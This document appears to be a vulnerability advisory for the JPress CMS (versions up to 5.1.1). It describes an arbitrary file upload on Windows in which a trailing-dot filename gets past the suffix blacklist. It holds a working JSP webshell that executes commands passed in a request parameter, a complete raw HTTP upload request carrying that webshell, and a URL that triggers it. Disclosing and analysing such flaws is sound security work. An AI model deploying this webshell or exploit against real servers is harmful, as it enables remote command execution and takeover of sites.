# Jpress has an arbitrary file upload vulnerability

## Affected version

≤5.1.1

## Software

https://github.com/JPressProjects/jpress

## Description

Jpress until v5.1.1 has arbitrary file uploads on the windows platform, and the construction of non-standard file formats such as .jsp. can lead to arbitrary command execution

## Detail

After setting up the project, log in to the backend with weak passwods `admin/admin`，then select`附件→根目录` and click `上传`

![image](https://github.com/user-attachments/assets/1c4cacf1-4b82-4697-b0fc-0bfe50f79ba2)

Let's choose a webshell file with the following code:

```Java
<% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
```

To make an upload, modify the file suffix `b.jsp`to `b.jsp.`, we can bypass the system's check for the file suffix and upload it to the tomcat root directory

![image](https://github.com/user-attachments/assets/9c10446e-e369-4b70-b681-63b673da1fc2)

![image](https://github.com/user-attachments/assets/3e630591-bb3d-4919-a63d-3f28aec6283c)


Then visit: [http://127.0.0.1:8080/b.%6a%73%70?pwd=023&i=whoami], execute the command `whoami`, you can see that the system parses the webshell and successfully executes the command `whoami`

![image](https://github.com/user-attachments/assets/af0a39ae-07e2-4ed7-99fc-ebbf87e44a78)



```Bash
POST /admin/attachment/doUplaodRootFile?csrf_token=ff67749ed950d998b909645f051b985f HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 484
sec-ch-ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOH6mHWg1yTaNq5YE
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/admin/attachment/root
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _jpanonym=MWEyNGExMmNlOGZjNjRiZGZkYWJlMDI4ZDY0ZDVhZjUjMTcyODU1NjczMDExNiMzMTUzNjAwMCNPVE01TmpJMVpqZGtPVFk1TkRoaFlXRmhOVGRsTVRjMVl6Wm1ZelF3TXpZPQ==; _jpuid=YmMxZTA2ODJjYjVmOGVkMDkwYWNmNjUyNjNkZjMxYjEjMTcyODU1Njc0ODk3NyMxNzI4MDAjTVE9PQ==; csrf_token=ff67749ed950d998b909645f051b985f; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1728556751; HMACCOUNT=E4C3DC92B0190419; Hm_lpvt_bfe2407e37bbaa8dc195c5db42daf96a=1728556858
Connection: close

------WebKitFormBoundaryOH6mHWg1yTaNq5YE
Content-Disposition: form-data; name="files[]"; filename="b.jsp."
Content-Type: application/octet-stream

<% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
------WebKitFormBoundaryOH6mHWg1yTaNq5YE--


```

## analyze

The vulnerability is located at `io.jpress.web.admin._AttachmentController#doUplaodRootFile`method, lines188 calls the `AttachmentUtils#isUnsafe` method

![image](https://github.com/user-attachments/assets/bba30e81-5849-4670-8e83-0068919732cf)

![image](https://github.com/user-attachments/assets/75788aa5-734f-4bea-8761-099743d614e2)

Here, the file upload suffix is filtered to determine whether the suffix is in the following blacklist:

![image](https://github.com/user-attachments/assets/25781389-5e4e-4c5c-a432-949bc97d42ed)

Therefore, we can use the features of the Windows platform to upload file names that do not comply with the Windows file naming rules, such as changing `b.jsp` to `b.jsp.` , and the Windows system will automatically remove the content after the non-compliant symbols, so as to bypass the blacklist policy and upload any files

